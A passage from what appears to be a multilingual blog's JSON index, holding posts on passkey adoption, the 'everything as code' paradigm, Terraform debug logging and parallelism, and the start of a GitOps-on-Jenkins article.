Services/OS that support Passkey: Bitwarden Windows (Windows Hello) iOS Android Websites/Apps that support Passkey: Amazon Apple ID iOS only GitHub Google Account Internet Identity LinkedIn npmjs.com WhatsApp (Android &amp; iOS) Yahoo Websites that do not yet support Passkey but support Multi-Factor Authentication (MFA): Atlassian and its product family such as Bitbucket Docker Gitlab terraform.io Wellfound.com You are encouraged to adopt Passkeys for enhanced security, as they are not susceptible to traditional phishing attacks and do not require memorizing complex passwords. With the support of industry giants and the convenience they offer, Passkeys are set to become the new standard in digital security.","categories":[{"name":"Cybersecurity","slug":"Cybersecurity","permalink":"https://neo01.com/categories/Cybersecurity/"}],"tags":[]},{"title":"万物皆代码 - 趋势还是必然？","slug":"2023/10/Everything_as_Code_a_Trend_or_Necessity-zh-CN","date":"un66fin66","updated":"un44fin44","comments":true,"path":"/zh-CN/2023/10/Everything_as_Code_a_Trend_or_Necessity/","permalink":"https://neo01.com/zh-CN/2023/10/Everything_as_Code_a_Trend_or_Necessity/","excerpt":"从基础设施到 AI 模型,探索万物皆代码的范式如何改变软件开发。了解各领域成熟度评估与最佳实践。","text":"💡 什么是万物皆代码？万物皆代码是一种范式，将软件开发、交付或运营的任何方面视为代码工件，可以使用与应用程序代码相同的工具和流程进行版本控制、测试和部署。 在云计算、自动化和 DevSecOps 时代，「万物皆代码」或简称「即代码」的概念变得越来越流行和相关。但这意味着什么，采用它有什么好处和挑战？ 🧬 你知道吗？生命即代码就是基因组。正如 DNA 编码构建和操作生物体的指令一样，「即代码」编码构建和操作软件系统的指令。两者都是版本化的（通过进化或版本控制）、测试的（通过自然选择或自动化测试）和部署的（通过繁殖或持续部署）。 即代码涵盖各个领域，例如： 基础设施即代码（IaC）：使用配置文件或脚本定义和管理云资源（如服务器、网络和存储）的实践。Terraform 是基础设施即代码的最佳代表。 策略即代码：将安全、合规或治理规则表达为代码并强制执行的实践，可以集成到开发和部署管道中。 架构即代码：使用基于代码的格式定义和记录软件架构决策、模式和结构的实践，可以进行版本控制和验证。像 Structurizr 和 C4 模型这样的工具使架构师能够以编程方式描述系统架构，确保架构文档与实现保持同步。 图表即代码：使用可以渲染成图形格式的代码创建和更新图表（如架构图或流程图）的实践。 演示即代码：使用可以转换为不同格式或平台的代码创建和更新演示文稿（如幻灯片或报告）的实践。slidev 是其中一个工具，但 HTML/CSS/JS 和 VBA 可能是可读性较差的替代方案。 数据库即代码：使用可以由数据库引擎或工具执行的代码定义和管理数据库模式、数据和迁移的实践。 文档即代码：使用纯文本格式（如 Markdown 或 AsciiDoc）编写和维护文档的实践，可以由文档生成器处理或集成到代码仓库中。有无数框架可以从程序员友好的代码生成人类可读的文档。 配置管理即代码：使用可以动态或静态应用的代码定义和管理应用程序设置（如环境变量或功能标志）的实践。 UI 即代码：使用可以渲染到不同设备或平台的代码创建和更新用户界面（如网页或移动应用）的实践。UI 通常使用 XML 和 HTML 存储，但从编程语言生成也并不罕见。 AI 即代码：使用可以使用 AI 框架或平台训练和部署的代码创建和更新人工智能模型（如机器学习或深度学习模型）的实践。同时，模型可以通过推理「分层」。Ollama 具有类似 Dockerfile 的即代码，除了系统提示外，还可以用于该目的。 即代码的主要优势： 一致性：即代码确保软件开发、交付或运营的所有方面彼此一致，并与应用程序代码一致。这减少了可能由手动或临时干预引起的错误、冲突和差异。 可重用性：即代码使代码工件能够在不同的项目、环境或团队之间重用。这提高了开发者和运营者之间的效率、生产力和协作。 可追溯性：即代码提供了对软件开发、交付或运营任何方面所做更改的清晰完整历史记录。这有助于审计、调试和排查软件生命周期中可能发生的问题。 可扩展性：即代码允许轻松快速地扩展云资源、工作流或模型以满足不断变化的需求或要求。这提高了软件系统的性能、可用性和弹性。 自动化：即代码使原本繁琐、耗时或容易出错的任务自动化。这使开发者和运营者能够专注于更具创造性或战略性的活动。 AI 友好：即代码提供结构化、机器可读的格式，AI 系统可以轻松解析、理解和生成。这使 AI 助手能够帮助创建、修改和优化基础设施、文档、配置和其他工件，加速开发工作流程并减少人为错误。 即代码的主要挑战： 复杂性：即代码为软件开发、交付或运营引入了额外的抽象和复杂性层。这要求开发者和运营者学习新技能、工具和语言来处理不同领域的即代码。 集成：即代码需要集成各种工具和平台以支持不同领域的即代码。这可能会给开发者和运营者带来兼容性问题、安全风险或维护开销。 测试：大多数即代码需要对代码工件进行严格测试以确保其正确性、可靠性和质量。这可能需要开发者和运营者额外的资源、时间或专业知识。 是否合理？ 对于每个用例使用即代码是否合理？答案取决于几个因素，例如： 项目的性质和范围：某些项目可能比其他项目更受益于即代码，这取决于它们的规模、复杂性或领域。例如，大规模、分布式或数据密集型项目可能比小规模、单体或逻辑密集型项目更受益于 IaC、WaC 或 AIC。 工具和平台的成熟度和可用性：某些工具和平台可能比其他工具和平台更好地支持即代码，这取决于它们的功能、功能性或兼容性。例如，某些云提供商可能为 IaC 提供更多选项和灵活性，或某些 AI 框架可能为 AIC 提供更多功能和性能。 开发者和运营者的技能和偏好：某些开发者和运营者可能比其他人更喜欢即代码，这取决于他们的技能、经验或风格。例如，某些开发者可能更喜欢编写代码而不是使用图形界面，或某些运营者可能更喜欢使用代码而不是使用仪表板。 各领域即代码的状态 📊 即代码成熟度评估基于当前行业采用和工具成熟度： 即代码 状态 合理性（最高 5 星） 基础设施 非常成熟且广泛使用 ⭐⭐⭐⭐⭐ 策略 成熟但未被广泛使用 ⭐⭐⭐ 架构 随着 Structurizr 和 C4 等工具的采用而增长 ⭐⭐⭐⭐ 图表 取决于图表类型。有些难以调整布局 ⭐⭐⭐ 演示 难以微调布局和创建动画 ⭐ 数据库 ⭐⭐⭐⭐⭐ 文档 Markdown 等 ⭐⭐⭐⭐ 配置 ⭐⭐⭐ UI 可以用编程语言生成 ⭐⭐⭐⭐ AI 模型可以分层 ⭐⭐ 图表即代码资源 Mermaid JS https://mermaid.js.org/ 在 YAML 语言中表示图表即代码的最佳方式是通过 MermaidJS，这是一个可以即时生成图表的 JavaScript 库。GitHub 和许多平台原生支持 MermaidJS。其他平台如 Hexo（生成此博客）也有插件来使用 MermaidJS 渲染图表。与其他图表即代码库相比，错误消息非常直观。强烈推荐用于编写简单图表。 PlantUML https://github.com/plantuml/plantuml 一个知名的图表即代码生成器，从人类可读的语言生成图像。即使在处理 Java 程序时，它也以可容忍的速度生成图像。此工具支持多页图表。然而，即使它支持各种布局类型，掌握定位也可能具有挑战性。随着图表变得更复杂，线条可能会覆盖标签，并可能出现其他问题。 AWS Diagram-as-Code https://github.com/awslabs/diagram-as-code 该项目始于 2024 年 2 月，相对较新。图表看起来很好，带有图标和分组： 虽然它使用 YAML，但一旦开始设置资源之间的链接，使用其结构编写图表可能会很痛苦。你需要至少写四行来有效地描述它们，例如 Source、Target、SourcePosition 和 TargetPosition。 不推荐，除非你想从 CloudFormation 中的基础设施即代码快速生成图表，或从 Terraform 转换。然而，你仍然需要大量工作来完成图表。 结论 总之，即代码是一种强大且有前途的范式，可以增强软件开发、交付或运营。然而，它也带来了自己的挑战和权衡，在采用之前需要仔细考虑。 🎯 关键要点即代码不是一刀切的解决方案，而是一个依赖于上下文的选择，取决于项目、工具和相关人员。","categories":[{"name":"Development","slug":"Development","permalink":"https://neo01.com/categories/Development/"}],"tags":[],"lang":"zh-CN"},{"title":"萬物皆代碼 - 趨勢還是必然？","slug":"2023/10/Everything_as_Code_a_Trend_or_Necessity-zh-TW","date":"un66fin66","updated":"un44fin44","comments":true,"path":"/zh-TW/2023/10/Everything_as_Code_a_Trend_or_Necessity/","permalink":"https://neo01.com/zh-TW/2023/10/Everything_as_Code_a_Trend_or_Necessity/","excerpt":"從基礎設施到 AI 模型,探索萬物皆代碼的範式如何改變軟體開發。了解各領域成熟度評估與最佳實踐。","text":"💡 什麼是萬物皆代碼？萬物皆代碼是一種範式，將軟體開發、交付或營運的任何方面視為代碼工件，可以使用與應用程式代碼相同的工具和流程進行版本控制、測試和部署。 在雲端運算、自動化和 DevSecOps 時代，「萬物皆代碼」或簡稱「即代碼」的概念變得越來越流行和相關。但這意味著什麼，採用它有什麼好處和挑戰？ 🧬 你知道嗎？生命即代碼就是基因組。正如 DNA 編碼建構和操作生物體的指令一樣，「即代碼」編碼建構和操作軟體系統的指令。兩者都是版本化的（透過進化或版本控制）、測試的（透過自然選擇或自動化測試）和部署的（透過繁殖或持續部署）。 即代碼涵蓋各個領域，例如： 基礎設施即代碼（IaC）：使用配置檔案或腳本定義和管理雲端資源（如伺服器、網路和儲存）的實踐。Terraform 是基礎設施即代碼的最佳代表。 策略即代碼：將安全、合規或治理規則表達為代碼並強制執行的實踐，可以整合到開發和部署管道中。 架構即代碼：使用基於代碼的格式定義和記錄軟體架構決策、模式和結構的實踐，可以進行版本控制和驗證。像 Structurizr 和 C4 模型這樣的工具使架構師能夠以程式化方式描述系統架構，確保架構文件與實作保持同步。 圖表即代碼：使用可以渲染成圖形格式的代碼建立和更新圖表（如架構圖或流程圖）的實踐。 簡報即代碼：使用可以轉換為不同格式或平台的代碼建立和更新簡報（如投影片或報告）的實踐。slidev 是其中一個工具，但 HTML/CSS/JS 和 VBA 可能是可讀性較差的替代方案。 資料庫即代碼：使用可以由資料庫引擎或工具執行的代碼定義和管理資料庫模式、資料和遷移的實踐。 文件即代碼：使用純文字格式（如 Markdown 或 AsciiDoc）編寫和維護文件的實踐，可以由文件產生器處理或整合到代碼儲存庫中。有無數框架可以從程式設計師友善的代碼產生人類可讀的文件。 配置管理即代碼：使用可以動態或靜態應用的代碼定義和管理應用程式設定（如環境變數或功能標誌）的實踐。 UI 即代碼：使用可以渲染到不同裝置或平台的代碼建立和更新使用者介面（如網頁或行動應用）的實踐。UI 通常使用 XML 和 HTML 儲存，但從程式語言產生也並不罕見。 AI 即代碼：使用可以使用 AI 框架或平台訓練和部署的代碼建立和更新人工智慧模型（如機器學習或深度學習模型）的實踐。同時，模型可以透過推理「分層」。Ollama 具有類似 Dockerfile 的即代碼，除了系統提示外，還可以用於該目的。 即代碼的主要優勢： 一致性：即代碼確保軟體開發、交付或營運的所有方面彼此一致，並與應用程式代碼一致。這減少了可能由手動或臨時干預引起的錯誤、衝突和差異。 可重用性：即代碼使代碼工件能夠在不同的專案、環境或團隊之間重用。這提高了開發者和營運者之間的效率、生產力和協作。 可追溯性：即代碼提供了對軟體開發、交付或營運任何方面所做變更的清晰完整歷史記錄。這有助於稽核、除錯和排查軟體生命週期中可能發生的問題。 可擴展性：即代碼允許輕鬆快速地擴展雲端資源、工作流程或模型以滿足不斷變化的需求或要求。這提高了軟體系統的效能、可用性和彈性。 自動化：即代碼使原本繁瑣、耗時或容易出錯的任務自動化。這使開發者和營運者能夠專注於更具創造性或策略性的活動。 AI 友善：即代碼提供結構化、機器可讀的格式，AI 系統可以輕鬆解析、理解和產生。這使 AI 助手能夠幫助建立、修改和最佳化基礎設施、文件、配置和其他工件，加速開發工作流程並減少人為錯誤。 即代碼的主要挑戰： 複雜性：即代碼為軟體開發、交付或營運引入了額外的抽象和複雜性層。這要求開發者和營運者學習新技能、工具和語言來處理不同領域的即代碼。 整合：即代碼需要整合各種工具和平台以支援不同領域的即代碼。這可能會給開發者和營運者帶來相容性問題、安全風險或維護開銷。 測試：大多數即代碼需要對代碼工件進行嚴格測試以確保其正確性、可靠性和品質。這可能需要開發者和營運者額外的資源、時間或專業知識。 是否合理？ 對於每個用例使用即代碼是否合理？答案取決於幾個因素，例如： 專案的性質和範圍：某些專案可能比其他專案更受益於即代碼，這取決於它們的規模、複雜性或領域。例如，大規模、分散式或資料密集型專案可能比小規模、單體或邏輯密集型專案更受益於 IaC、WaC 或 AIC。 工具和平台的成熟度和可用性：某些工具和平台可能比其他工具和平台更好地支援即代碼，這取決於它們的功能、功能性或相容性。例如，某些雲端提供商可能為 IaC 提供更多選項和靈活性，或某些 AI 框架可能為 AIC 提供更多功能和效能。 開發者和營運者的技能和偏好：某些開發者和營運者可能比其他人更喜歡即代碼，這取決於他們的技能、經驗或風格。例如，某些開發者可能更喜歡編寫代碼而不是使用圖形介面，或某些營運者可能更喜歡使用代碼而不是使用儀表板。 各領域即代碼的狀態 📊 即代碼成熟度評估基於當前產業採用和工具成熟度： 即代碼 狀態 合理性（最高 5 星） 基礎設施 非常成熟且廣泛使用 ⭐⭐⭐⭐⭐ 策略 成熟但未被廣泛使用 ⭐⭐⭐ 架構 隨著 Structurizr 和 C4 等工具的採用而增長 ⭐⭐⭐⭐ 圖表 取決於圖表類型。有些難以調整佈局 ⭐⭐⭐ 簡報 難以微調佈局和建立動畫 ⭐ 資料庫 ⭐⭐⭐⭐⭐ 文件 Markdown 等 ⭐⭐⭐⭐ 配置 ⭐⭐⭐ UI 可以用程式語言產生 ⭐⭐⭐⭐ AI 模型可以分層 ⭐⭐ 圖表即代碼資源 Mermaid JS https://mermaid.js.org/ 在 YAML 語言中表示圖表即代碼的最佳方式是透過 MermaidJS，這是一個可以即時產生圖表的 JavaScript 函式庫。GitHub 和許多平台原生支援 MermaidJS。其他平台如 Hexo（產生此部落格）也有外掛來使用 MermaidJS 渲染圖表。與其他圖表即代碼函式庫相比，錯誤訊息非常直觀。強烈推薦用於編寫簡單圖表。 PlantUML https://github.com/plantuml/plantuml 一個知名的圖表即代碼產生器，從人類可讀的語言產生圖像。即使在處理 Java 程式時，它也以可容忍的速度產生圖像。此工具支援多頁圖表。然而，即使它支援各種佈局類型，掌握定位也可能具有挑戰性。隨著圖表變得更複雜，線條可能會覆蓋標籤，並可能出現其他問題。 AWS Diagram-as-Code https://github.com/awslabs/diagram-as-code 該專案始於 2024 年 2 月，相對較新。圖表看起來很好，帶有圖示和分組： 雖然它使用 YAML，但一旦開始設定資源之間的連結，使用其結構編寫圖表可能會很痛苦。你需要至少寫四行來有效地描述它們，例如 Source、Target、SourcePosition 和 TargetPosition。 不推薦，除非你想從 CloudFormation 中的基礎設施即代碼快速產生圖表，或從 Terraform 轉換。然而，你仍然需要大量工作來完成圖表。 結論 總之，即代碼是一種強大且有前途的範式，可以增強軟體開發、交付或營運。然而，它也帶來了自己的挑戰和權衡，在採用之前需要仔細考慮。 🎯 關鍵要點即代碼不是一刀切的解決方案，而是一個依賴於上下文的選擇，取決於專案、工具和相關人員。","categories":[{"name":"Development","slug":"Development","permalink":"https://neo01.com/categories/Development/"}],"tags":[],"lang":"zh-TW"},{"title":"Everything as Code - A Trend or a Necessity?","slug":"2023/10/Everything_as_Code_a_Trend_or_Necessity","date":"un66fin66","updated":"un44fin44","comments":true,"path":"2023/10/Everything_as_Code_a_Trend_or_Necessity/","permalink":"https://neo01.com/2023/10/Everything_as_Code_a_Trend_or_Necessity/","excerpt":"From infrastructure to AI models, explore how the \"as code\" paradigm is transforming software development. Discover maturity assessments and best practices across 10+ domains.","text":"💡 What is Everything as Code?Everything as code is a paradigm that treats any aspect of software development, delivery, or operation as a code artifact that can be versioned, tested, and deployed using the same tools and processes as the application code. In the era of cloud computing, automation, and DevSecOps, the concept of “everything as code” or simply “as code” has become increasingly popular and relevant. But what does it mean, and what are the benefits and challenges of adopting it? 🧬 Did You Know?Life as code is genome. Just as DNA encodes the instructions for building and operating living organisms, &quot;as code&quot; encodes the instructions for building and operating software systems. Both are versioned (through evolution or version control), tested (through natural selection or automated testing), and deployed (through reproduction or continuous deployment). As code encompasses various domains, such as: Infrastructure as code (IaC): The practice of defining and managing cloud resources, such as servers, networks, and storage, using configuration files or scripts. Terraform is the best representation of Infrastructure as code. Policy as code: The practice of expressing and enforcing security, compliance, or governance rules as code that can be integrated into the development and deployment pipelines. Architecture as code: The practice of defining and documenting software architecture decisions, patterns, and structures using code-based formats that can be versioned and validated. Tools like Structurizr and C4 model enable architects to describe system architecture programmatically, ensuring architecture documentation stays synchronized with implementation. Diagram as code: The practice of creating and updating diagrams, such as architecture diagrams or flowcharts, using code that can be rendered into graphical formats. Presentation as code: The practice of creating and updating presentations, such as slides or reports, using code that can be converted into different formats or platforms. slidev is one of the tools, but HTML/CSS/JS and VBA can be less human-readable alternatives. Database as code: The practice of defining and managing database schemas, data, and migrations using code that can be executed by database engines or tools. Documentation as code: The practice of writing and maintaining documentation using plain text formats, such as Markdown or AsciiDoc, that can be processed by documentation generators or integrated into code repositories. There are countless frameworks to generate human-readable documents from programmer-friendly code. Configuration Management as code: The practice of defining and managing application settings, such as environment variables or feature flags, using code that can be applied dynamically or statically. UI as code: The practice of creating and updating user interfaces, such as web pages or mobile apps, using code that can be rendered into different devices or platforms. UI is usually stored with XML and HTML, but it is not uncommon to generate from programming languages. AI as code: The practice of creating and updating artificial intelligence models, such as machine learning or deep learning models, using code that can be trained and deployed using AI frameworks or platforms. Meanwhile, models can be “layered” with inferring. Ollama has Dockerfile-like as code that can be used for that purpose besides system prompts. The main advantages of as code are: Consistency: As code ensures that all aspects of software development, delivery, or operation are consistent with each other and with the application code. This reduces errors, conflicts, and discrepancies that may arise from manual or ad hoc interventions. Reusability: As code enables the reuse of code artifacts across different projects, environments, or teams. This increases efficiency, productivity, and collaboration among developers and operators. Traceability: As code provides a clear and complete history of changes made to any aspect of software development, delivery, or operation. This facilitates auditing, debugging, and troubleshooting issues that may occur during the software lifecycle. Scalability: As code allows for the easy and rapid scaling of cloud resources, workflows, or models to meet changing demands or requirements. This improves performance, availability, and resilience of software systems. Automation: As code enables the automation of tasks that are otherwise tedious, time-consuming, or error-prone. This frees up developers and operators to focus on more creative or strategic activities. AI-Friendly: As code provides structured, machine-readable formats that AI systems can easily parse, understand, and generate. This enables AI assistants to help create, modify, and optimize infrastructure, documentation, configurations, and other artifacts, accelerating development workflows and reducing human error. The main challenges of as code are: Complexity: As code introduces additional layers of abstraction and complexity to software development, delivery, or operation. This requires developers and operators to learn new skills, tools, and languages to deal with different domains of as code. Integration: As code requires the integration of various tools and platforms to support different domains of as code. This may pose compatibility issues, security risks, or maintenance overheads for developers and operators. Testing: Most as code demands rigorous testing of code artifacts to ensure their correctness, reliability, and quality. This may require additional resources, time, or expertise for developers and operators. Is it justified? Is it justified to use as code for each use case? The answer depends on several factors, such as: The nature and scope of the project: Some projects may benefit more from as code than others, depending on their size, complexity, or domain. For example, a large-scale, distributed, or data-intensive project may benefit more from IaC, WaC, or AIC than a small-scale, monolithic, or logic-intensive project. The maturity and availability of the tools and platforms: Some tools and platforms may support as code better than others, depending on their features, functionality, or compatibility. For example, some cloud providers may offer more options and flexibility for IaC than others, or some AI frameworks may offer more capabilities and performance for AIC than others. The skills and preferences of the developers and operators: Some developers and operators may prefer as code over others, depending on their skills, experience, or style. For example, some developers may enjoy writing code more than using graphical interfaces, or some operators may prefer using code more than using dashboards. Status of as code in each domain 📊 As Code Maturity AssessmentBased on current industry adoption and tooling maturity: as code status justified (5 star max) Infrastructure Very mature and widely used ⭐⭐⭐⭐⭐ Policy Mature but not being widely used ⭐⭐⭐ Architecture Growing adoption with tools like Structurizr and C4 ⭐⭐⭐⭐ Diagram Depends on diagram type. Some are difficult to adjust layout ⭐⭐⭐ Presentation Difficult to fine-tune layout and create animations ⭐ Database ⭐⭐⭐⭐⭐ Documentation Markdown and many more ⭐⭐⭐⭐ Configuration ⭐⭐⭐ UI Can be generated with programming language ⭐⭐⭐⭐ AI Model can be layered ⭐⭐ Diagram as Code Resources Mermaid JS https://mermaid.js.org/ The best way to represent diagrams as code in YAML language is through MermaidJS, a JavaScript library that can generate diagrams on the fly. GitHub and many platforms support MermaidJS natively. Other platforms like Hexo, which generates this blog, also have plugins to render diagrams with MermaidJS. The error messages are very intuitive compared to other diagram as code libraries. Highly recommended for writing simple diagrams. PlantUML https://github.com/plantuml/plantuml A well-known diagram as code generator produces images from human-readable language. It generates images at a tolerable speed, even when processing Java programs. This tool supports multiple-page diagrams. However, mastering positioning can be challenging even though it supports various layout types. Lines may run over labels and other issues may arise as your diagrams become more complex. AWS Diagram-as-Code https://github.com/awslabs/diagram-as-code The project began in February 2024, which is relatively fresh. The diagram looks nice with icons and grouping: Although it uses YAML, writing diagrams with its structure can be punishing once you start to set links between resources. You need to write at least four lines to describe them effectively, such as Source, Target, SourcePosition, and TargetPosition: links.yamlLinks: - Source: ALB SourcePosition: NNW Target: VPCPublicSubnet1Instance TargetPosition: SSE TargetArrowHead: Type: Open SourcePosition and TargetPosition are required because the line does not automatically position itself with respect to the resource. Although the diagram looks nice, it does not support AWS styling like callouts. Not recommended unless you want a quick diagram from infrastructure as code in CloudFormation, or converting from Terraform. However, you still need a lot of work to finalize a diagram. Conclusion In conclusion, as code is a powerful and promising paradigm that can enhance software development, delivery, or operation. However, it also comes with its own challenges and trade-offs that need to be considered carefully before adopting it. 🎯 Key TakeawayAs code is not a one-size-fits-all solution, but rather a context-dependent choice that depends on the project, the tools, and the people involved.","categories":[{"name":"Development","slug":"Development","permalink":"https://neo01.com/categories/Development/"}],"tags":[]},{"title":"Terraform 故障排除","slug":"2023/09/Troubleshooting_Terraform-zh-TW","date":"un33fin33","updated":"un00fin00","comments":true,"path":"/zh-TW/2023/09/Troubleshooting_Terraform/","permalink":"https://neo01.com/zh-TW/2023/09/Troubleshooting_Terraform/","excerpt":"掌握 Terraform 除錯技巧：啟用追蹤日誌、控制平行執行，讓基礎設施程式碼問題無所遁形。","text":"Terraform 是管理基礎設施即程式碼的絕佳工具，但有時當出現問題時，除錯可能會很棘手。在這篇部落格文章中，我將分享如何排除 Terraform 問題的技巧。 啟用除錯日誌 TF_LOG 環境變數允許您設定 Terraform 的日誌層級，這對於獲取有關 Terraform 在幕後執行的更多詳細資訊很有用。您可以將其設定為以下值之一：TRACE、DEBUG、INFO、WARN 或 ERROR。預設值為 INFO，僅顯示高層級訊息。要獲得更詳細的輸出，您可以將其設定為 DEBUG。TRACE 包含來自 DEBUG 的詳細資訊，但包括大多數除錯不需要的相依性分析詳細資訊。例如，您可以在執行 Terraform 之前執行此命令： export TF_LOG=DEBUG 然後 terraform plan 或在單行中執行 export TF_LOG=DEBUG &amp;&amp; terraform plan 如果您指定 TF_LOG_PATH 環境變數，日誌將儲存在檔案中。 TF_LOG_CORE 和 TF_LOG_PROVIDER 除錯日誌可能非常龐大，超過 100MB！如果您想專注於除錯提供者，您應該使用 TF_LOG_PROVIDER 搭配來自 TF_LOG 的參數。如果您懷疑相依性有問題，您應該使用 TF_LOG_CORE。 相依性和平行處理 Terraform 在執行前分析 Terraform 模組之間的相依性。相依性分析確保資源以正確的順序配置。同時，Terraform 使用分析結果透過識別可以同時配置或修改的獨立資源集來有效地平行執行操作。然而，來自並行執行的日誌非常難以閱讀，我們必須在 plan 和 apply 上使用參數 -parallelism=1 停用並行性。 使用 -parallelism=1，資源會依序一次建立/修改/銷毀一個。這允許更容易的除錯和故障排除，因為每個資源一次執行一個。例如，terraform apply -parallelism=1： graph TD A[Terraform 操作] --> C[資源 1 修改] C --> D[資源 2 修改] D --> E[Terraform 執行完成] 當未指定 -parallelism 時，預設值為 10。資源會平行建立/修改/銷毀，允許更快的執行。然而，這也可能使除錯和故障排除問題變得更加困難，因為多個資源同時執行。例如，terraform apply： graph TD A[Terraform 操作] --> C[資源 1 修改] A --> D[資源 2 修改] D --> E[Terraform 執行完成] C --> E","categories":[{"name":"Development","slug":"Development","permalink":"https://neo01.com/categories/Development/"}],"tags":[{"name":"terraform","slug":"terraform","permalink":"https://neo01.com/tags/terraform/"}],"lang":"zh-TW"},{"title":"Terraform 故障排除","slug":"2023/09/Troubleshooting_Terraform-zh-CN","date":"un33fin33","updated":"un00fin00","comments":true,"path":"/zh-CN/2023/09/Troubleshooting_Terraform/","permalink":"https://neo01.com/zh-CN/2023/09/Troubleshooting_Terraform/","excerpt":"掌握 Terraform 调试技巧：启用追踪日志、控制并行执行，让基础设施代码问题无所遁形。","text":"Terraform 是管理基础设施即代码的绝佳工具，但有时当出现问题时，调试可能会很棘手。在这篇博客文章中，我将分享如何排除 Terraform 问题的技巧。 启用调试日志 TF_LOG 环境变量允许您设置 Terraform 的日志级别，这对于获取有关 Terraform 在幕后执行的更多详细信息很有用。您可以将其设置为以下值之一：TRACE、DEBUG、INFO、WARN 或 ERROR。默认值为 INFO，仅显示高级别消息。要获得更详细的输出，您可以将其设置为 DEBUG。TRACE 包含来自 DEBUG 的详细信息，但包括大多数调试不需要的依赖性分析详细信息。例如，您可以在运行 Terraform 之前运行此命令： export TF_LOG=DEBUG 然后 terraform plan 或在单行中运行 export TF_LOG=DEBUG &amp;&amp; terraform plan 如果您指定 TF_LOG_PATH 环境变量，日志将存储在文件中。 TF_LOG_CORE 和 TF_LOG_PROVIDER 调试日志可能非常庞大，超过 100MB！如果您想专注于调试提供者，您应该使用 TF_LOG_PROVIDER 搭配来自 TF_LOG 的参数。如果您怀疑依赖性有问题，您应该使用 TF_LOG_CORE。 依赖性和并行处理 Terraform 在执行前分析 Terraform 模块之间的依赖性。依赖性分析确保资源以正确的顺序配置。同时，Terraform 使用分析结果通过识别可以同时配置或修改的独立资源集来有效地并行执行操作。然而，来自并发执行的日志非常难以阅读，我们必须在 plan 和 apply 上使用参数 -parallelism=1 停用并发性。 使用 -parallelism=1，资源会依序一次创建/修改/销毁一个。这允许更容易的调试和故障排除，因为每个资源一次执行一个。例如，terraform apply -parallelism=1： graph TD A[Terraform 操作] --> C[资源 1 修改] C --> D[资源 2 修改] D --> E[Terraform 执行完成] 当未指定 -parallelism 时，默认值为 10。资源会并行创建/修改/销毁，允许更快的执行。然而，这也可能使调试和故障排除问题变得更加困难，因为多个资源同时执行。例如，terraform apply： graph TD A[Terraform 操作] --> C[资源 1 修改] A --> D[资源 2 修改] D --> E[Terraform 执行完成] C --> E","categories":[{"name":"Development","slug":"Development","permalink":"https://neo01.com/categories/Development/"}],"tags":[{"name":"terraform","slug":"terraform","permalink":"https://neo01.com/tags/terraform/"}],"lang":"zh-CN"},{"title":"Troubleshooting Terraform","slug":"2023/09/Troubleshooting_Terraform","date":"un33fin33","updated":"un66fin66","comments":true,"path":"2023/09/Troubleshooting_Terraform/","permalink":"https://neo01.com/2023/09/Troubleshooting_Terraform/","excerpt":"Master Terraform debugging with trace logs, parallelism control, and dependency analysis to solve infrastructure code issues efficiently.","text":"Terraform is a great tool for managing infrastructure as code, but sometimes it can be tricky to debug when things go wrong. In this blog post, I’ll share tips on how to troubleshoot Terraform issues. Enabling Debug Log The TF_LOG environment variable allows you to set the log level for Terraform, which can be useful for getting more details about what Terraform is doing behind the scenes. You can set it to one of these values: TRACE, DEBUG, INFO, WARN, or ERROR. The default is INFO, which only shows high-level messages. To get more verbose output, you can set it to DEBUG. TRACE has details from DEBUG but includes dependency analysis details that are not needed for most debugging. For example, you can run this command before running Terraform: export TF_LOG=DEBUG and then terraform plan or run it in a single line export TF_LOG=DEBUG &amp;&amp; terraform plan If you specify the TF_LOG_PATH environment variable, logs will be stored in the file. TF_LOG_CORE and TF_LOG_PROVIDER The debug log can be massive and over 100MB! If you would like to focus on debugging a provider, you should use TF_LOG_PROVIDER with arguments from TF_LOG. If you suspect a problem with dependencies, you should use TF_LOG_CORE. Dependency and Parallelism Terraform analyzes dependencies between Terraform modules before execution. Dependency analysis ensures resources are provisioned in the correct order. Meanwhile, Terraform uses the analysis results for efficient parallel execution of operations by identifying independent sets of resources that can be provisioned or modified concurrently. However, logs from concurrent execution are very difficult to read, and we have to disable the concurrency with the parameter -parallelism=1 on plan and apply. With -parallelism=1, resources are created/modified/destroyed one at a time, in sequence. This allows for easier debugging and troubleshooting, as each resource is executed one at a time. e.g., terraform apply -parallelism=1: graph TD A[Terraform Operation] --> C[Resource 1 Modification] C --> D[Resource 2 Modification] D --> E[Terraform Execution Completed] When -parallelism is not specified, the default value is 10. The resources are created/modified/destroyed in parallel, allowing for faster execution. However, this can also make it more difficult to debug and troubleshoot issues, as multiple resources are executed simultaneously. e.g., terraform apply: graph TD A[Terraform Operation] --> C[Resource 1 Modification] A --> D[Resource 2 Modification] D --> E[Terraform Execution Completed] C --> E","categories":[{"name":"Development","slug":"Development","permalink":"https://neo01.com/categories/Development/"}],"tags":[{"name":"terraform","slug":"terraform","permalink":"https://neo01.com/tags/terraform/"}]},{"title":"GitOps on Jenkins Pipelines","slug":"2023/09/GitOps_on_Jenkins","date":"un11fin11","updated":"un66fin66","comments":true,"path":"2023/09/GitOps_on_Jenkins/","permalink":"https://neo01.com/2023/09/GitOps_on_Jenkins/","excerpt":"It's 3 AM and deployment failed? Just git revert and redeploy! Learn how to manage Jenkins pipelines as code using seeder scripts, with state management patterns and security best practices.","text":"What is GitOps? Picture this: It’s 3 AM, and a deployment went wrong. Instead of frantically clicking through Jenkins UI trying to remember what you changed, you simply run git revert and redeploy. That’s the power of GitOps. GitOps means managing your entire infrastructure like you manage code in Git – every change tracked, every deployment reproducible, every rollback just a commit away. GitOps is a way of managing your infrastructure and applications using Git as the single source of truth. It lets you define your desired state in code, and then use tools to apply that state to your environments. GitOps enables continuous delivery, as any change in your Git repository triggers a pipeline that deploys the new version of your code. graph LR A([Developer]) -->|Commits| B[(Git Repository)] B -->|Triggers| C[CI/CD Pipeline] E[(Object Store)] -->|Reads State| C C -->|Deploys| D[Infrastructure] D -->|Writes State| E style B fill:#87CEEB style C fill:#90EE90 style D fill:#FFD700 style E fill:#FFA07A GitOps for Jenkins Pipelines In the context of Jenkins pipelines, GitOps can be used to manage pipelines by treating the pipeline configuration as code, and using Git to manage changes to that code. This allows developers to version control their pipeline configurations, collaborate on changes with other team members, and easily roll back changes if necessary. Think of it this way: instead of manually clicking through Jenkins UI to create and configure pipelines, you write code that describes what pipelines you want, commit it to Git, and let automation create them for you. Managing Jenkins Pipelines with Seeder Scripts A seeder script is a script to create and maintain your pipelines on Jenkins. It is usually written in Groovy scripts. Here is an example of a seeder script that creates pipelines in Jenkins. The script uses the Job DSL plugin to define the pipeline jobs in a declarative way. The script loops through a list of repositories and creates a pipeline job for each one. 